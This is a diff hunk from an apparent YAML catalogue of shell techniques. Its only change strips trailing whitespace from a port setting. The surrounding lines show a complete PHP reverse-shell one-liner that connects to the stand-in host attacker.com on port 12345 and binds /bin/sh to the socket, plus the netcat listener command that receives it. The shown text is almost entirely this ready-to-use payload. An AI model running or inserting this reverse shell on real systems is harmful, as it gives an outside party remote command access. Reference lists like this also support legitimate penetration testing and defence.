@@ -35,6 +35,6 @@ functions:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
-        export RPORT=12345 
+        export RPORT=12345
         php -r '$sock=fsockopen($_ENV["RHOST"],$_ENV["RPORT"]);exec("/bin/sh -i <&3 >&3 2>&3");'
 ---
